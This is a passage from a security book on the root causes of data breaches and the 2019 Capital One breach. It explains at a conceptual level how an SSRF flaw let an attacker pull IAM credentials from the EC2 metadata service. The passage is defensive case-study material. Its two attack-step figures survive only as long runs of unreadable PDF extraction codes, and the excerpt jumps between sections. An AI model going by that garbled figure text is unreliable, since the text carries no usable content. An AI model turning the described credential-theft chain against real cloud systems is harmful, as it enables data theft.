remotely take control  of a running program and even the entire machine that the program is  running on. When such defects are discovered by the manufacturer of  the software, the manufacturer typically issues a “patch” to fix the defect.  Once discovered, it is particularly critical to have such defects patched and  corrected as quickly as possible. As soon as software patches are available  from the manufacturer, both customers and attackers become aware of not  only the patch but the underlying security defects that the patch is meant  to fix. It then becomes a race for customers to deploy the fixes before  attackers exploit them.  One might hope that patches could secretly be made available only to  customers without letting attackers know about them, but that tends to be  very difficult for routine fixes. From time to time, there are some patches  that are so critical from a security perspective and that could impact such  a large amount of computing infrastructure that companies do work  together to deploy fixes in as fast and coordinated a way as possible once a  patch becomes available.  26   Chapter 1    the root Causes of Data BreaChes  For example, in 2018, the Spectre and Meltdown vulnerabilities were   publicly disclosed—the upshot of these vulnerabilities was that an attacker  could steal data by defeating the isolation that microprocessors and cloud  services are supposed to offer when software from two different customers  run on the same machine. The security researchers that discovered Spectre  and Meltdown worked together with microprocessor manufacturers and  the major cloud platforms months ahead of time to develop patches prior  to making their research on the vulnerability known to the world.  Although some security vulnerabilities in software are identified   by the manufacturer, there are some vulnerabilities that are identified  by parties that do not disclose the vulnerabilities to the manufacturer.  Such vulnerabilities are called zero-day vulnerabilities as once they are  published or exploited, defenders have no time  zero days  to react to  patch them.  In some cases, intelligence agencies have identified such   vulnerabilities and attempted to keep them secret until they might like  to use them for their advantage. In many cases, attackers have identified  such vulnerabilities and only use them to mount attacks against their  targets at the right time. That said, the overwhelming majority of software  vulnerabilities that are exploited by attackers are vulnerabilities that are  known to the manufacturer and customers, but the available patches have  simply not been applied yet. Only in the most advanced attacks does one  typically see zero-day vulnerabilities exploited.  One of the most significant examples of a known software vulnerability    i.e., not a “zero-day”  that resulted in one of the largest financial data  breaches is the Equifax breach of 2017. In that particular breach, an Apache  Struts server, a third-party, open source software package used to support  the development of modern Java applications, was out of date and had  a known security vulnerability. Although Equifax’s security team had let  others at the company know about the vulnerability via email, and informed  them that it should be patched, they did not have a “closed- loop” system   27   Chapter 1    the root Causes of Data BreaChes  in place for patch management  e.g., using a ticketing system to assign the  patching work to a particular system administrator  or a robust technical  verification process to confirm that the patch had been successfully applied  once it was made. As such, while the existence of the vulnerability was a  known “critical” vulnerability which could allow an attacker to remotely  issue commands of an attacker’s choice, the vulnerability was left open,  unaddressed, and untracked for months. Attackers used that vulnerability as  the point of initial compromise in a breach that resulted in over 140 million  financial records being stolen which included SSNs and credit histories. We  cover the Equifax breach in detail in Chapter 4.   Inadvertent Employee Mistakes The final “technical” root cause of breaches that we cover is inadvertent  mistakes by employees  that are not due to phishing . Phishing is an example  of an inadvertent employee mistake that is so prevalent that it deserves its  own root cause in our set of the top six technical root causes. The employee’s  mistake in a phishing attack, of course, is that they inadvertently allow  themselves to be “socially engineered” or tricked into surrendering their  legitimate credentials to an impostor site, or perhaps even click a malware  drive-by-download link that is embedded in a spear phishing email.  One example of an inadvertent employee mistake that is responsible  for quite a few data exposures is system misconfiguration. An example of  such a system misconfiguration is setting the configuration of a data store  to be “public” instead of “private” especially when data stores provided  by cloud providers  e.g., Amazon Web Services, Microsoft Azure, and  Google Cloud  are used. When such a misconfiguration occurs, almost  anyone on the Internet can view the sensitive data that is in the data store  instead of just employees or programs at the customer of the cloud data  store. Table 1-2 shows several very significant data breaches from 2017  alone that occurred due to Amazon’s Simple Storage Service  S3  being  misconfigured.   28   Chapter 1    the root Causes of Data BreaChes  Table 1-2.  Selected Amazon S3 Breaches from 201711  Entity Breached  Data Exposed  Booz Allen  Hamilton  Battlefield imagery and administrator credentials to sensitive  systems  US Voter Records  personal data about 198 million american voters  Dow Jones & Co  personally identifiable information for 2.2 million people  Verizon Wireless  Time Warner  Cable  Pentagon  Accenture  personally identifiable information for 6 million people and  sensitive corporate information about It systems, including  login credentials  personally identifiable information about 4 million customers,  proprietary code, and administrator credentials  terabytes of information from spying archive, resume for  intelligence positions—including security clearance and  operations history, credentials and metadata from an intra- agency intelligence sharing platform  Master access keys for accenture’s account with aWs Key  Management system, plaintext customer password databases,  and proprietary apI data  There are many types of inadvertent employee mistakes beyond such   system misconfigurations that can result in security breaches. In fact, some  reports, such as IBM’s 2014 Cyber Security Intelligence Index, claim that a  majority of security breaches occur due to human errors of some kind:  95 percent of all security incidents involve human error. Many  of these are successful security attacks from external attackers  who prey on human weakness in order to lure insiders within  organizations to unwittingly provide them with access to sen- sitive information.  11 Leaky Buckets, https:  businessinsights.bitdefender.com worst-amazon-  breaches, Bitdefender.  29   Chapter 1    the root Causes of Data BreaChes  In IBM’s report, the following items are attributed to human error:     System misconfiguration     Poor patch management     Default usernames and passwords     Easy-to-guess passwords  incorrect email address     Lost laptops and mobile devices     Clicking an infected URL     Disclosure of regulated information via the use of an   Of all these issues, though, we believe that only system   misconfiguration and disclosure of regulated information via the use of an  incorrect email address are truly human errors. That said, even for those  two types of human errors, we believe that technology can help prevent  such errors. We do not believe that the remaining items can be blamed  solely on humans, for reasons that we describe now.  If we are to advance our field, we cannot rely on humans to be perfect  and get every single minute detail right. Although system administrators,  for instance, can easily misconfigure systems to result in breaches, we need  to deploy more automated tools to help system administrators identify and  fix misconfigurations such that we do not need to rely on humans correctly  setting the many hundreds of parameters that have to be set perfectly  to keep systems secure. From a security perspective, it is important for  software architects and system designers to keep in mind the limitations   of humans when they develop new systems and design systems that are  self-maintaining and secure by default.  Similarly, we do not believe that poor patch management is due to   human error of system administrators who may be expected to manually  patch machines. When a patch needs to be rolled out to hundreds of  thousands of servers, for instance, it is inevitable that some of those   30   Chapter 1    the root Causes of Data BreaChes  machines will be down, some will be in the process of rebooting, or  some will be in a failed crashed state at any given time. When a patch  does not succeed on one machine or even on a small percentage, that is  not a human error, but rather a failure to put a systematic, closed-loop  patch management process with technical verification in place. If a patch  fails the first time, a follow-up automated scan should identify that and  be automatically reattempted until the presence of the patch can be  technically verified. The only human error may be that of the CISO or CIO  to not have put such a systematic process in place for patch management.  As such, we would categorize the Equifax breach as a software security  vulnerability management failure, and not a simple human error, unlike  the CEO of Equifax who had attempted to blame its breach on a system  administrator in Congressional hearings following the breach.  Default usernames and passwords can easily be tried by attackers to  get into systems simply by having familiarity with which manufacturers  of equipment or software are used by a particular organization. That  said, vulnerability scanners routinely check for default usernames and  passwords, and if an appropriate closed-loop vulnerability management  process with technical verification is in place, default usernames and  passwords can also be easily identified by automated systems and  mitigated as a potential cause of breach.  Easy-to-guess passwords can also be prevented and identified by   automated means by  1  requiring that users choose strong passwords and   2  by running automated tools such as “crack” to systematically identify  when easy-to-guess passwords are in use; once identified, easy-to-guess  passwords can be changed.  Disclosure of regulated information via the use of an incorrect email   address is what happens when an employee sends an email with sensitive  information to the wrong person. Although that is indeed a human error,  data loss and prevention  DLP  systems may be able to use artificial  intelligence to determine when such occurrences may be about to take  place and prompt the user with an “Are you sure?  Please check that the   31   Chapter 1    the root Causes of Data BreaChes  recipient is absolutely correct, and that they absolutely need to be sent  the sensitive information contained herein. ” message to prevent such  breaches. In addition, such a system could escalate such an email attempt  to a manager or a colleague to have a second set of eyes double-verify as  needed.  When an employee loses a laptop which does not have their drive   encrypted, we do not blame such a breach on the employee as an  inadvertent employee human factor mistake, but rather it is the error  of the CISO or CIO not having appropriate systems in place to make  sure that device encryption is enabled on all devices. As discussed in  the “Unencrypted Data” section earlier, should a laptop be lost and the  device is properly encrypted, there is no breach. Loss of devices should  be considered an expected use case that security and IT teams need to  plan for, and an organization should not have a data breach because an  employee inadvertently loses an unencrypted device.  Finally, with regard to clicking an infected link URL  e.g., a link that   leads to a malware drive-by-download , one can attempt to blame the  “error” on the human clicking the link, but we do not believe that is a  reasonable approach. If we look at the history of consumer devices and  technology, and fields such as electrical safety, the trend has been to make  technology so easy and safe for consumers to use that they  unless they are  doing something egregiously negligent  have the expectation that they will  be safe and secure, and they will be unlikely to be able to hurt themselves  while using the technology. As such, one viewpoint is that humans should  be able to click anything to their heart’s content, and our anti-virus, anti-  malware, and isolation technologies should be good enough that they will  make sure it will be very unlikely that the user’s machine will get infected.  Overall, while we believe that inadvertent human mistakes is still a   useful category of a root cause of breaches to cover issues such as system  misconfiguration and emailing the wrong person sensitive data intended  for another, it is a category that we should not use to cover the majority of  data breaches. If we are to advance the field, we should work to continually   32   Chapter 1    the root Causes of Data BreaChes  reduce the impact that human error can have on security and leverage  automated, systematic countermeasures that can be employed to mitigate  the other five root causes of breaches.   Summary In summary, there are three “meta-level” root causes and six technical root  causes that data breaches occur. The “meta-level” root causes are failure  to prioritize security, failure to invest in security, and failure to execute on  security initiatives.  If an organization fails to prioritize, invest, and execute on its security   initiatives, it implicitly plans to have a data breach, and such will likely  occur due to one or more of six technical root causes. Even when an  organization does prioritize, invest, and execute on its security initiatives,  there is still risk, though, as it could experience a breach due to one or  more of the six technical root causes.  The six technical root causes are unencrypted data, phishing, malware,  third-party compromise or abuse, software vulnerabilities, and inadvertent  employee mistakes. The overwhelming majority of breaches have occurred  due to these root causes.  33   CHAPTER 2  The Capital One   Breach  Once I pulled a job, I was so stupid. I picked a guy’s pocket on  an airplane and made a run for it.  —Rodney Dangerfield, American comedian  The Capital One breach of 2019 was the largest single cloud security   breach that had occurred at its time. In the breach, more than 100 million  credit card applications were stolen by an ex-Amazon employee  Paige  A. Thompson  who went by the Twitter handle  or alias  of “Erratic.” The  credit card application data set that she stole contained 140,000 SSNs and  80,000 bank account numbers. Capital One estimated that the breach  could cost over $300 million1 and was fined $80 million in 2020 by the  Office of the Comptroller of the Currency, a banking regulator.  Capital One is a leading financial institution that specializes in   consumer banking services such as credit cards and other types of loans,  including automobile loans. According to their website, Capital One is  “the nation’s fifth-largest consumer bank and eighth-largest bank overall.”  Capital One has been very aggressive in its use of cloud technology. “We   1 https:  securityboulevard.com 2019 12 cost-of-data-breaches-in-2019- the-4-worst-hits-on-the-corporate-wallet     Neil Daswani and Moudy Elbayadi 2021  N.

Although attribution of attacks, especially when  conducted by an organized criminal group or by a nation-state, can often  involve advanced computer forensics and take years, the attribution in  the Capital One breach was relatively straightforward and fast. Incident  response teams and law enforcement agencies often hope that even  sophisticated attackers will make a mistake at some point, ideally a  mistake that allows them to put breadcrumbs together and find out “who  did it.” In the case of the Capital One breach, Erratic left her resume in  the same GitLab file repository in which she archived the stolen data.  It  is unclear as to whether or not she had left her resume in the repository  inadvertently or on purpose.    Erratic Erratic did not seem to be an organized cybercriminal who was conducting  the breach as work for hire or work for profit. She also did not seem to  be getting paid by a nation-state. She happened to have the necessary  technical skills to conduct the breach, as she was once a systems engineer  at Amazon. She accessed Capital One’s cloud via a virtual private network   VPN  by the name of ipredator, and she used the Tor3 “onion router” that  attempted to obscure her communications and her identity through layers  of intermediate machines similar to what an organized cybercriminal or   2 www.datacenterknowledge.com cloud capital-one-shut-down-its-last-  three-data-centers-next-year 3 Note that Tor has many legitimate, privacy-preserving applications, but can also  be used to make illicit activities harder to trace.  36   Chapter 2    the Capital One BreaCh   nation-state actor may have done. Usage of a VPN and Tor by attackers is  an attempt to avoid logging and tracking online activity by hiding one’s  true IP address such that one can, say, be in Seattle but have an IP address  appearing to be coming from a Russian geolocation.  That said, she seems to have been an amateur in very many ways. She   publicly posted various details about the breach she was conducting on  Twitter and Slack as per the screenshot in Figure 2-1. In her tweets, she  mentioned which VPN she used, and she also mentioned that she used  Tor as per the screenshot in Figure 2-2. She seemed to have some idea  that she might be doing something wrong as per Figure 2-3. Experienced  security researchers, organized cybercriminals, and nation-state attackers  would probably not have posted such comments. There was also some  concern about her mental health  which we will not delve into in this  chapter , which may explain why there was so much evidence by which  she incriminated herself.

In some sense, Capital One  behaved more like a software company in its use and adoption of cloud  services rather than a traditional financial institution which may have  been more conservative around the use of new technology. In 2018, Rob  Alexander, their CIO, said, “Here’s the way I describe our transformation –  from an IT shop in a bank to a technology company.”4 Capital One  publicly announced its partnership with Amazon Web Services years  before their mega-breach occurred and often presented their work and  advancements at Amazon’s re:Invent developer’s conference. In 2015,  Capital One announced that all its new applications would run the cloud,  and all its existing applications would be rearchitected for the cloud. They  even scraped all internal plans to launch a private “hybrid cloud” in which  some on-premise data centers would be used in parallel with a private  cloud. Their approach was at odds with most other financial institutions  that were more conservative in their adoption of the cloud. That said,  usage of cloud services in and of itself does not necessarily need to carry  more risk.  Some might argue that their aggressive adoption of a new technology  and a major focus on a digital transformation may have hurt them. Others  feel that what happened to Capital One could have happened to almost  any other organization that leveraged cloud services. Cloud services  were getting wide adoption at the time of the breach. Such services  have hundreds or sometimes thousands of configuration parameters.  With so many parameters, it may be near impossible for them to all be  set correctly. Cloud service providers need to make it harder to make  mistakes in setting such parameters and need to have default settings that   4 www.informationweek.com strategic-cio executive-insights-and-  innovation capital-one-cio-were-a-software-company d d-id 1333457?  39   Chapter 2    the Capital One BreaCh   are secure. AWS provides two services  AWS Inspector for EC2 instances  and AWS Trusted Advisor  to help in that regard. However, running those  services and taking appropriate action on the findings remain the sole  responsibility of the customer. It also takes much effort to use all these  configuration parameters to perfectly achieve security design principles  and goals, such as the principle of least privilege, which states that a  person or a running program should only be given the minimal access  needed to only do the job that is expected.  Interestingly enough, given Capital One’s leadership in cloud   services, they had even developed a tool called Cloud Custodian that  could potentially have provided systematic, scalable  security  policy  enforcement and could have been used to prevent the breach. Apparently,  though, it did not.  Also, the breach of the 100 million credit card applications was not  the first breach that Capital One had. Table 2-1 shows a few Capital One  breaches from the PrivacyRights.Org database. In 2017, Capital One had a  breach in which a former employee may have accessed customer personal  information, including account numbers, transaction history, and social  security numbers. A similar breach involving an employee had also  occurred in 2014. However, these breaches were relatively small, revolving  around fraudulent employees, somewhat typical of what one might see  at the scale of a large financial institution, and did not involve Capital  One’s cloud at all. Unfortunately, the mega-breach at Capital One in 2019  involved a former employee of one of their suppliers, Amazon.  40   Chapter 2    the Capital One BreaCh   Table 2-1.

Over 6,000 JpMorgan  Chase and Capital One bank accounts were defrauded for  over $3 million.  Capital One had sent notification to customers regarding  a possible breach to their personal information. they  discovered that a former employee of the company may  have improperly accessed customer accounts, which  could have been linked to unauthorized transactions. the  information accessed included names, account numbers,  social security numbers, payment information, and other  account information.  Someone made or attempted to make unauthorized  transactions by logging in with a stolen username and  password. the fraudster may have had access to victims’  names, addresses, full or partial account numbers, and  transaction history.   continued   41   Chapter 2    the Capital One BreaCh   Table 2-1.   continued   Date of  Breach  Number of  Records  9-aug- 18 500  Description of Breach  information on this security breach was provided by the  Office of the California attorney General, and the number  of breached records reported reflects a best estimate; the  number is estimated as the minimum number of breached  records necessary to trigger the obligation of notification  to the attorney General under the California statute. no  other details regarding this breach were available from  privacyrights.Org.   Cloud Basics To explain how the attack worked, we will first explain how a few  key components of Amazon’s cloud service, Amazon Web Services   AWS , work. Our goal is to explain just enough so that the anatomy  of the attack makes sense to someone unfamiliar with cloud-based  software development and operations. Cloud services, including AWS,  allow software developers to run their own programs on machines in  Amazon’s “cloud” data centers instead of data centers owned by their  own company or in traditional data centers of web hosting companies. In  this explanation, it is important to keep in mind that other cloud service  providers, including Microsoft Azure and Google Cloud, among others,  work similarly, even though we will be referring to Amazon’s specifics.  There are naturally some differences between cloud providers, but the  distinctions are beyond the scope of our discussion here.  As Amazon allows many different customers to run their programs  on Amazon’s machines at the same time, precautions need to be taken  to protect customer’s programs from interfering with each other, as well   42   Chapter 2    the Capital One BreaCh   as to protect Amazon’s machines from getting infected or taken over  by malware. One such precaution is that customer programs are run in  “virtual” machines. Virtual machines allow the programs to think they are  running directly on a real machine that they own all to themselves. Many  virtual machines can also be run on a single real machine at the same time  such that it allows for high efficiency and allows cloud providers to get as  much juice as possible out of a single real machine. If a program running in  one virtual machine happens to be waiting for a few milliseconds for data  coming from the network or from disk in order to run some computation  on the real machine’s CPU, a program from another virtual machine can  use the real machine’s CPU instead in the meantime until the data needed  arrives. A few milliseconds are eons for a CPU, and much efficiency can be  gained by using every nanosecond that a CPU has available!  Of course, reality is much more complicated as there is some efficiency   that can be lost when switching between programs running on different  virtual machines. Servers have multiple CPUs, and further efficiency can be  achieved by associating a single virtual machine with one of the CPUs while  multiplexing access to other computational resources such as RAM and  graphics chips on a motherboard.  In any case, a virtual machine in Amazon’s parlance is called an   EC2  “Elastic Compute Cloud”  instance. A program running on an EC2  instance may need some help from Amazon to conduct its functions. For  instance, it may need to know its IP address to communicate with other  programs. An IP address, or Internet Protocol address, is like a phone  number that programs on the Internet need to talk to each other. Programs  can ask, or query, Amazon’s “metadata service”  which is typically running  on the same “machine” as the EC2 instance  for such information. The metadata service should typically only be accessible to the   programs locally running in an EC2 instance. However, in the attack on  Capital One, Erratic was able to remotely send queries to the metadata  service to access sensitive information even though she did not have direct  access to run her programs on Capital One’s EC2 instance.  43   Chapter 2    the Capital One BreaCh   Another important component that many programs running in the   cloud use is data storage, especially when programs need to write or read  large amounts of data. To address that need, Amazon provides a “Simple  Storage Service”  or S3, for short  that allows programs to both store  and retrieve large amounts of data. S3 allows programs to store data in  “buckets” which are simply like file folders on a disk.  S3 buckets can be configured to be public or private. Public buckets   can be accessed by anyone on the Internet. Private buckets should, of  course, be used to store sensitive or confidential data and cannot be  accessed by anyone on the Internet unless they have specific security  credentials. Amazon’s S3 needs to be presented security credentials in the  form of a secret access key and other parameters before access to private  buckets is allowed.  In traditional data centers, network firewalls are typically used to provide   the most basic forms of access control. Network firewall rules are used  to specify which machines are allowed to talk to which other machines.  Programs on one machine may want to communicate with programs on  another machine. Programs talk to each other through “sockets.” A running  program, also called a process, is on each side of the socket, and a port  number is assigned to each side of the socket. The most basic network  firewall rules specify what ports on a given machine may accept connections  from processes  on other machines or even from the same machine .  In a cloud setting, the concept of a security group serves a function   similar to that of traditional network firewall rules. Although security  groups can specify which machines are and are not allowed to connect  to which ports on an EC2 instance, security groups do not control which  people can connect to an EC2 instance or even which people can read  from or write to an S3 bucket. Rather, an IAM  or identity and access  management  role specifies which people may be allowed to do so.  One final component that would be useful to be aware of  that is not   specific to Amazon or cloud services, in general  is a web application  firewall  WAF . Once a network firewall or an AWS security group allows   44   Chapter 2    the Capital One BreaCh   for communication with a web server, a WAF can be used to further impose  constraints on communications with the web server and web applications  that make up, say, a publicly facing website. Given that many websites  typically need to allow anyone on the Internet to communicate with them,  a WAF inspects the communications between a web client  e.g., a browser   and the web server to determine if an attack might be taking place  and  potentially cut off communication if so . WAFs typically have rules to  look for common attacks on the Web such as SQL injection and cross-site  scripting  which were the topic of my  Neil’s  last book Foundations of  Security: What Every Programmer Needs to Know  Apress, 2007  .   The Attack Now that we have covered all the basic components, both cloud and non-  cloud specific, we will explain how the attack occurred.

The  particular WAF that Capital One was running was mod_security, which is a  very popular web application firewall module for the massively pervasive  Apache web server. Both mod_security and Apache’s web server are open  source software, but the fact that they were open source did not contribute  to the breach. The EC2 instance was open for access to the entire Internet,  which is why a WAF was being used to monitor for potential attacks. Note  that there is an Amazon metadata service running which the EC2 instance  can access.  The final component in Figure 2-4 is Capital One’s S3 buckets, which   store over 100 million credit card applications.   Buckets Private to WAF Role Capital One’s S3 buckets were not public buckets, though, and did not get  breached simply because they were simply exposed on the Internet, as  were the buckets in Table 1-2 from Chapter 1 in which the Pentagon, Dow  Jones, Verizon Wireless, and so on suffered breaches.  Rather, Capital One’s S3 buckets were private and configured to be  accessible to an IAM role that was assigned to the WAF. However, it is  unclear why the WAF should have been given access to the S3 buckets with  the 100 million credit card applications. Although Capital One’s S3 buckets  were not misconfigured to be public, they potentially were misconfigured  to be accessible to the WAF instead of a more restrictive role—say, to only a  dedicated program that needed to process credit card applications instead  of the WAF whose job it was to mediate web requests coming from the  external world.  46   Chapter 2    the Capital One BreaCh   EC2 Instance Vulnerable to Server-Side Request  Forgery  SSRF  In addition, the software running on the EC2 instance was susceptible to  an SSRF, or server-side request forgery, attack. That is, while the metadata  service is typically only supposed to be accessible to the EC2 instance,  it was possible for an attacker on the Internet to get the EC2 instance to  relay queries to the metadata service and have the answers to the queries  relayed back! The attack is called server-side request forgery because it  was possible for the attacker to “forge” a request to the metadata service  that would be honored because it appeared to come from the EC2 instance   a server  and not from an external attacker  the client . Erratic probed  Capital One’s EC2 instance and had determined that it was vulnerable to  SSRF. Armed with that knowledge, Erratic was then able to start issuing  requests that leveraged the vulnerability.  Although one can imagine that some metadata requests might be   innocuous and harmless, Erratic issued metadata requests that were able  to steal credentials. Figure 2-5 shows Step 1 in Erratic’s attack. She sent  a request containing a URL that would ask the metadata service what  security credentials the EC2 instance had. Because the EC2 instance was  vulnerable to SSRF, the request was relayed to the metadata service. The  metadata service answered the request by revealing that the EC2 instance  had the ***-WAF-WebRole, and that answer was relayed to Erratic.  47   Chapter 2    the Capital One BreaCh    cid:346  cid:425  cid:393  cid:855  cid:876  cid:876  cid:1005  cid:1010  cid:1013  cid:856  cid:1006  cid:1009  cid:1008  cid:856  cid:1005  cid:1010  cid:1013  cid:856  cid:1006  cid:1009  cid:1008  cid:876  cid:349  cid:258  cid:373  cid:876  cid:400  cid:286  cid:272  cid:437  cid:396  cid:349  cid:410  cid:455  cid:882  cid:272  cid:396  cid:286  cid:282  cid:286  cid:374  cid:415  cid:258  cid:367  cid:400   cid:910  cid:910  cid:910  cid:882  cid:116  cid:4  cid:38  cid:882  cid:116  cid:286  cid:271  cid:90  cid:381  cid:367  cid:286    cid:1005    cid:4  cid:425  cid:258  cid:272  cid:364  cid:286  cid:396   cid:68  cid:258  cid:272  cid:346  cid:349  cid:374  cid:286    cid:28  cid:18  cid:1006  cid:3  cid:349  cid:374  cid:400  cid:410  cid:258  cid:374  cid:272  cid:286  cid:3  cid:396  cid:286  cid:367  cid:258  cid:455  cid:286  cid:282  cid:3   cid:396  cid:381  cid:367  cid:286  cid:3  cid:349  cid:374  cid:296  cid:381  cid:3  cid:282  cid:437  cid:286  cid:3  cid:410  cid:381  cid:3  cid:94  cid:94  cid:90  cid:38  cid:3   cid:448  cid:437  cid:367  cid:374  cid:286  cid:396  cid:258  cid:271  cid:349  cid:367  cid:349  cid:410  cid:455  cid:856    cid:18  cid:381  cid:374  cid:296  cid:437  cid:400  cid:286  cid:282  cid:3  cid:24  cid:286  cid:393  cid:437  cid:410  cid:455  cid:855   cid:39  cid:258  cid:448  cid:286  cid:3  cid:396  cid:381  cid:367  cid:286  cid:3  cid:349  cid:374  cid:296  cid:381  cid:3  cid:258  cid:400  cid:3  cid:286  cid:454  cid:393  cid:286  cid:272  cid:410  cid:286  cid:282  cid:3   cid:272  cid:381  cid:374  cid:400  cid:437  cid:373  cid:286  cid:396  cid:3  cid:449  cid:258  cid:400  cid:3  cid:28  cid:18  cid:1006  cid:3  cid:349  cid:374  cid:400  cid:410  cid:258  cid:374  cid:272  cid:286  cid:856    cid:18  cid:258  cid:393  cid:349  cid:410  cid:258  cid:367  cid:3  cid:75  cid:374  cid:286    cid:115  cid:437  cid:367  cid:374  cid:286  cid:396  cid:258  cid:271  cid:367  cid:286  cid:3  cid:115  cid:349  cid:396  cid:410  cid:437  cid:258  cid:367  cid:3    cid:68  cid:258  cid:272  cid:346  cid:349  cid:374  cid:286    cid:894  cid:28  cid:18  cid:1006  cid:3  cid:47  cid:374  cid:400  cid:410  cid:258  cid:374  cid:272  cid:286  cid:895    cid:90  cid:437  cid:374  cid:374  cid:349  cid:374  cid:336  cid:3  cid:68  cid:381  cid:282  cid:94  cid:286  cid:272  cid:437  cid:396  cid:349  cid:410  cid:455   cid:116  cid:4  cid:38    cid:258  cid:374  cid:282  cid:876  cid:381  cid:396  cid:3  cid:449  cid:286  cid:271  cid:3  cid:258  cid:393  cid:393  cid:367  cid:349  cid:272  cid:258  cid:415  cid:381  cid:374    cid:448  cid:437  cid:367  cid:374  cid:286  cid:396  cid:258  cid:271  cid:367  cid:286  cid:3  cid:3  cid:410  cid:381  cid:3  cid:94  cid:94  cid:90  cid:38    cid:68  cid:286  cid:410  cid:258  cid:882   cid:24  cid:258  cid:410  cid:258   cid:94  cid:286  cid:396  cid:448  cid:349  cid:272  cid:286    cid:18  cid:258  cid:393  cid:349  cid:410  cid:258  cid:367  cid:3  cid:75  cid:374  cid:286   cid:94  cid:1007  cid:3  cid:17  cid:437  cid:272  cid:364  cid:286  cid:410  cid:400    cid:449  cid:349  cid:410  cid:346  cid:3  cid:1005  cid:1004  cid:1004  cid:68  cid:3  cid:272  cid:396  cid:286  cid:282  cid:349  cid:410  cid:3  cid:272  cid:258  cid:396  cid:282  cid:3  cid:258  cid:393  cid:393  cid:367  cid:349  cid:272  cid:258  cid:415  cid:381  cid:374  cid:400    cid:4  cid:18  cid:62  cid:855  cid:3  cid:910  cid:910  cid:910  cid:882  cid:116  cid:4  cid:38  cid:882  cid:116  cid:286  cid:271  cid:90  cid:381  cid:367  cid:286   Figure 2-5.  Step 1 of Erratic’s attack  In Step 2 of the attack, Erratic proceeded to ask for the security   credentials for the ***-WAF-WebRole, as per Figure 2-6. Because the EC2  instance was vulnerable to SSRF, it happily relayed Erratic’s request for the  credentials onto the metadata service. While the metadata service typically  only expects that security credentials that it provides would be used by the  EC2 instance, the credentials were relayed back to Erratic due to the SSRF  vulnerability.   cid:28  cid:18  cid:1006  cid:3  cid:349  cid:374  cid:400  cid:410  cid:258  cid:374  cid:272  cid:286  cid:3  cid:396  cid:286  cid:367  cid:258  cid:455  cid:286  cid:282  cid:3   cid:258  cid:272  cid:272  cid:286  cid:400  cid:400  cid:3  cid:364  cid:286  cid:455  cid:400  cid:3  cid:282  cid:437  cid:286  cid:3  cid:410  cid:381  cid:3   cid:94  cid:94  cid:90  cid:38  cid:3  cid:448  cid:437  cid:367  cid:374  cid:286  cid:396  cid:258  cid:271  cid:349  cid:367  cid:349  cid:410  cid:455  cid:856    cid:18  cid:381  cid:374  cid:296  cid:437  cid:400  cid:286  cid:282  cid:3  cid:24  cid:286  cid:393  cid:437  cid:410  cid:455  cid:855   cid:39  cid:258  cid:448  cid:286  cid:3  cid:258  cid:272  cid:272  cid:286  cid:400  cid:400  cid:3  cid:364  cid:286  cid:455  cid:400  cid:3  cid:258  cid:400  cid:3  cid:286  cid:454  cid:393  cid:286  cid:272  cid:410  cid:286  cid:282  cid:3   cid:272  cid:381  cid:374  cid:400  cid:437  cid:373  cid:286  cid:396  cid:3  cid:449  cid:258  cid:400  cid:3  cid:28  cid:18  cid:1006  cid:3  cid:349  cid:374  cid:400  cid:410  cid:258  cid:374  cid:272  cid:286  cid:856    cid:18  cid:258  cid:393  cid:349  cid:410  cid:258  cid:367  cid:3  cid:75  cid:374  cid:286    cid:115  cid:437  cid:367  cid:374  cid:286  cid:396  cid:258  cid:271  cid:367  cid:286  cid:3  cid:115  cid:349  cid:396  cid:410  cid:437  cid:258  cid:367  cid:3    cid:68  cid:258  cid:272  cid:346  cid:349  cid:374  cid:286    cid:894  cid:28  cid:18  cid:1006  cid:3  cid:47  cid:374  cid:400  cid:410  cid:258  cid:374  cid:272  cid:286  cid:895    cid:90  cid:437  cid:374  cid:374  cid:349  cid:374  cid:336  cid:3  cid:68  cid:381  cid:282  cid:94  cid:286  cid:272  cid:437  cid:396  cid:349  cid:410  cid:455   cid:116  cid:4  cid:38    cid:258  cid:374  cid:282  cid:876  cid:381  cid:396  cid:3  cid:449  cid:286  cid:271  cid:3  cid:258  cid:393  cid:393  cid:367  cid:349  cid:272  cid:258  cid:415  cid:381  cid:374    cid:448  cid:437  cid:367  cid:374  cid:286  cid:396  cid:258  cid:271  cid:367  cid:286  cid:3  cid:3  cid:410  cid:381  cid:3  cid:94  cid:94  cid:90  cid:38    cid:68  cid:286  cid:410  cid:258  cid:882   cid:24  cid:258  cid:410  cid:258   cid:94  cid:286  cid:396  cid:448  cid:349  cid:272  cid:286    cid:4  cid:425  cid:258  cid:272  cid:364  cid:286  cid:396   cid:68  cid:258  cid:272  cid:346  cid:349  cid:374  cid:286    cid:1006    cid:346  cid:425  cid:393  cid:855  cid:876  cid:876  cid:1005  cid:1010  cid:1013  cid:856  cid:1006  cid:1009  cid:1008  cid:856  cid:1005  cid:1010  cid:1013  cid:856  cid:1006  cid:1009  cid:1008  cid:876  cid:349  cid:258  cid:373  cid:876  cid:400  cid:286  cid:272  cid:437  cid:396  cid:349  cid:410  cid:455  cid:882  cid:272  cid:396  cid:286  cid:282  cid:286  cid:374  cid:415  cid:258  cid:367  cid:400  cid:876  cid:910  cid:910  cid:910  cid:882  cid:116  cid:4  cid:38  cid:882  cid:116  cid:286  cid:271  cid:90  cid:381  cid:367  cid:286   cid:18  cid:258  cid:393  cid:349  cid:410  cid:258  cid:367  cid:3  cid:75  cid:374  cid:286  cid:3  cid:4  cid:272  cid:272  cid:286  cid:400  cid:400  cid:60  cid:286  cid:455  cid:47  cid:282  cid:853  cid:3  cid:94  cid:286  cid:272  cid:396  cid:286  cid:410  cid:4  cid:272  cid:272  cid:286  cid:400  cid:400  cid:60  cid:286  cid:455  cid:853  cid:3  cid:100  cid:381  cid:364  cid:286  cid:374    cid:18  cid:258  cid:393  cid:349  cid:410  cid:258  cid:367  cid:3  cid:75  cid:374  cid:286   cid:94  cid:1007  cid:3  cid:17  cid:437  cid:272  cid:364  cid:286  cid:410  cid:400    cid:449  cid:349  cid:410  cid:346  cid:3  cid:1005  cid:1004  cid:1004  cid:68  cid:3  cid:272  cid:396  cid:286  cid:282  cid:349  cid:410  cid:3  cid:272  cid:258  cid:396  cid:282  cid:3  cid:258  cid:393  cid:393  cid:367  cid:349  cid:272  cid:258  cid:415  cid:381  cid:374  cid:400    cid:4  cid:18  cid:62  cid:855  cid:3  cid:910  cid:910  cid:910  cid:882  cid:116  cid:4  cid:38  cid:882  cid:116  cid:286  cid:271  cid:90  cid:381  cid:367  cid:286   Figure 2-6.  Step 2 of Erratic’s attack  48   Chapter 2    the Capital One BreaCh    Confused Deputy: Metadata Service In both of the previous steps, the metadata service was a confused deputy.  In computer science, a confused deputy is a 